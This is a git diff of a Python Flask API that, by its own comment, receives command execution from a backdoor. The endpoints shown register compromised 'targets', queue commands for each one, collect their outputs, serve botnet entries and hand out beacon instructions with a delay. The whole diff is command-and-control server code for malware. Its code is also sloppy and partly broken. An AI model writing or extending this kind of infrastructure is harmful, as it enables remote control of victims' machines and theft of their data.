@@ -1,10 +1,11 @@
 from flask import Blueprint,jsonify,request,session
 from sqlalchemy.orm import sessionmaker
+from datetime import datetime
 
-from db.modle import APICommand,APILink,ApiToken,Instraction
+from db.modle import APICommand,APILink,ApiToken,Instraction,Targets,BotNet
 from db.mange_db import config,_create_engine
 from utility.email_temp import email_temp
-from utility.processer import log,getlist
+from utility.processer import log,getlist,readFromJson,writeToJson
 
 emailTemplate = email_temp()
 
@@ -13,42 +14,149 @@ _session = Session()
 
 api = Blueprint('api',__name__)
 
-# flage and cheack for instraction
-@api.route('/api/get_instraction/<target_name>')
-def get_instraction(target_name=None):
-    if request.method == 'GET' and target_name != None:
-        api_token = request.args('token')
-        valid = _session.query(ApiToken).filter(token=api_token).first()
-        if valid:
-            data = getlist(_session.query(Instraction).filter_by(token=api_token).all(),sp=',')
-            return {'instraction': data},200
-        else:
-            return {'Erorr': "Invalid api_token or didn't provid api_token"},404
-    else:
-        return {'Error': "Unsupported method or didn't provid target name"}
-
 # recive excute command from the backdoor
-@api.route('/api/ApiCommand',methods=['POST','GET'])
-def apiCommand():
+@api.route('/api/ApiCommand/<target_name>')
+def apiCommand(target_name):
+
     if request.method == 'GET':
+
         try:
+
             api_token = request.args('token')
-            valid = _session.query(ApiToken).filter(token=api_token).first()
+            valid = getlist(_session.query(ApiToken).filter(token=api_token).all(),sp=',')
+
             if valid:
-                apiCommand = getlist(_session.query(APICommand).filter_by().all(),sp=',')
+                apiCommand = getlist(_session.query(APICommand).filter_by(target_name=target_name,condition='0').all(),sp=',')
+
                 return {'allCommand': apiCommand},200
+            
             else:
                 return {'Erorr': 'Invalid api_token or no api token provided'},404
+            
         except Exception as e:
-            log(f"[Error] ocuer at /_api_command method={request.method} ,error={e}")
+
+            log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
             _session.rollback()
+
             return {'error': 'Server side Error'},500
+        
         finally:
             _session.close()
-    elif request.method == 'POST':
-        api_token = request.args('token')
-        valid = _session.query(ApiToken).filter(token=api_token).first()
-        if valid:
-            ...
+    
     else:
-        return {'Error': 'Unsupported method'}
+
+        return {'Error': 'Unsupported method'},405
+
+
+@api.route('/api/Apicommand/save_output',methods=['POST'])
+def save_output():
+    if request.method == 'POST':
+        try:
+            token = request.json.get('token')
+            target_name = request.json.get('target_name')
+            valid = getlist(_session.query(Targets).filter_by(target_name=target_name,token=token).all(),sp=',')
+
+            if len(valid) != 0:
+                data = readFromJson()
+                outputs = request.json.get('output')
+
+                for output in outputs:
+                    outputData = {output[0]: output[1]}
+                    writeToJson(data=data,section='output',info=outputData)
+
+                return {'message': 'Outputs were seved'},200
+            
+        except Exception as e:
+
+            log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
+            return {'Erorr': 'Invalid api_token or no api token provided'},404
+    else:
+        return {'Error': "Unsupported method or didn't provid target name"},405
+
+
+@api.route('/api/BotNet/<target_name>')
+def BotNet(target_name):
+    if request.method == 'GET':
+        try:
+            token = request.args('token')
+            botNets = getlist(_session.query(BotNet).filter_by(target_name=target_name,token=token).all())
+            response = {}
+
+            for botNet in botNets:
+                response[botNet[-2]] = botNet[-1]
+            
+            return response,200
+        
+        except Exception as e:
+
+            log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
+            return {'Erorr': 'Invalid api_token or no api token provided'},404
+    else:
+        return {'Error': "Unsupported method or didn't provid target name"},405
+
+
+from datetime import datetime
+from flask import request
+
+@api.route('/api/registor_target', methods=['POST'])
+def registor_target():
+    if request.method == 'POST':
+        try:
+            apitoken = request.json.get('token')
+            print(apitoken)
+            target_name = request.json.get('target_name')
+            print(target_name)
+
+            if not apitoken or not target_name:
+                return {'Error': 'Token or target_name not provided'}, 400
+
+            # Validate API token
+            valid = getlist(_session.query(ApiToken).filter_by(token=apitoken).all(), sp=',')
+            print(valid)
+            if len(valid) != 0:
+                # Append datetime to target_name to make it unique
+                target_name = target_name + str(datetime.now())
+                target = Targets(target_name, valid[0][1], apitoken)
+                _session.add(target)
+                _session.commit()
+
+                return {'target_name': target_name}, 200  # Return 200 OK status
+
+        except Exception as e:
+            _session.rollback()
+            log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
+            return {'Error': 'Internal server error'}, 500  # Return 500 for internal errors
+
+        finally:
+            _session.close()
+
+    # Handle unsupported methods
+    return {'Error': "Unsupported method or didn't provide target name"}, 405
+
+
+
+@api.route('/api/get_instraction/<target_name>')
+def instarction(target_name):
+    if request.method == 'GET':
+        try:
+            print('i am the problame')
+            token = request.args.get('token')
+            print(token)
+            valid = getlist(_session.query(ApiToken).filter_by(token=token).all(),sp=',')
+
+            if len(valid) != 0:
+
+                instraction = getlist(_session.query(Instraction).filter_by(target_name=target_name).all(),sp=',')
+                if len(instraction) != 0:
+                    return {'delay': instraction[0][1],'instraction': instraction[0][-1]},200
+                return {'Message': 'No instraction found'},404
+            else:
+                return {'error': 'Invalid api token'},403
+            
+        except Exception as e:
+            log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
+            return {'Erorr': 'Invalid api_token or no api token provided'},404
+    else:
+        return {'Error': "Unsupported method or didn't provid target name"},405
+
+
